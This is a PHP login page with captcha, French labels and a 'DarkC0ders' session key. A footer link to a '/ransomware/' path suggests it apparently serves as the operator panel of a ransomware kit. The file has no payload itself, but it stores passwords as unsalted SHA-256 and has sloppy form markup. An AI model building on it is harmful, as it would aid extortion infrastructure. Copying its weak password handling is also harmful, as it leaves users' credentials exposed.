<?php 
session_start();
include_once("../securimage/securimage.php");
$sec = new Securimage();
if (isset($_POST['doLogin']))
{
	$captcha_code = $_POST['captcha_code'];
	if ($sec->check($captcha_code) != false)
	{
		include '../includes/config.php';
		$username = $_POST['username'];
		$password = hash("sha256", $_POST['password']);
		if (ctype_alnum($username))
		{
			$sel = $odb->prepare("SELECT id,password FROM users WHERE username = :user");
			$sel->execute(array(":user" => $username));
			list($userid,$pass) = $sel->fetch();
			if ($pass != "" || $pass != NULL)
			{
				if ($password == $pass)
				{
					$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :user, :ip, :act, UNIX_TIMESTAMP())");
					$i->execute(array(":user" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":act" => "Logged in"));
					$_SESSION['DarkC0ders'] = $username.":".$userid;
					header("Location: ../");
				}
			}
		}
	}
}
?>
<!DOCTYPE html>
<html>
<head>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.5/css/materialize.min.css">
  <style>
    body {
      display: flex;
      min-height: 100vh;
      flex-direction: column;
    }

    main {
      flex: 1 0 auto;
    }

    body {
      background: #f0faff;
    }

    .input-field input[type=date]:focus + label,
    .input-field input[type=text]:focus + label,
    .input-field input[type=email]:focus + label,
    .input-field input[type=password]:focus + label {
      color: #e91e63;
    }

    .input-field input[type=date]:focus,
    .input-field input[type=text]:focus,
    .input-field input[type=username]:focus,
    .input-field input[type=password]:focus {
      border-bottom: 2px solid #e91e63;
      box-shadow: none;
    }
  </style>
</head>

<body>
 <div class="section"></div>
  <main>
    <center>
      <div class="container">
        <div class="z-depth-0 grey lighten-4 row" style="display: inline-block; padding: 1px 10px 0px 10px; border: 0px solid #EEE;">
           <div class="card">
                <div class="card-image waves-effect waves-block waves-light">
                  <img class="activator" src="../assets/images/logo.jpg">
                </div>
            <div class="card-content">
               <span class="card-title activator grey-text text-darken-4">Connectez-vous avec votre compte<i class="material-icons btn-floating halfway-fab waves-effect waves-light grey right">add</i></span>
                 <p><a href="https://panafricaine.com/ransomware/">&copy; hakanonymos@hotmail.com</a></p>

            </div>
             <div class="card-reveal">
              <span class="card-title grey-text text-darken-4">Connexion<i class="material-icons right">close</i></span>
               <form class="col s12" method="post">
                <div class='row'>
                  <div class='col s12'>
                  </div>
                </div>

            <div class='row'>
              <div class='input-field col s12'>
			  	<form action="" method="POST">
                <input class='validate' type='text' name='username' id='username' />
                <label for='username'>Nom d'utilisateur</label>
              </div>
            </div>

            <div class='row'>
              <div class='input-field col s12'>
                <input class='validate' type='password' name='password' id='password' />
                <label for='password'>Mot de passe</label>
              </div>
             <div class='input-field col s12'>
			  	<form action="" method="POST">
                <input type="text" name="captcha_code" class='validate' maxlength="6" name='captcha_code' id='captcha_code' >
                 <label for='captcha_code'>Captcha Code</label>
             </div>
			  <center><img id="captcha" src="../securimage/securimage_show.php" alt="CAPTCHA Image" /></center>
            </div>

            <br />
            <center>
              <div class='row'>
                <button type='submit' name='doLogin' class='col s12 btn btn-large waves-effect indigo'>Connexion</button>
              </div>
            </center>
                 </form>
            </div>
         </div>
        </div>
      </div>
     
    </center>

    
  </main>

  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.min.js"></script>
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.5/js/materialize.min.js"></script>
</body>
</html>
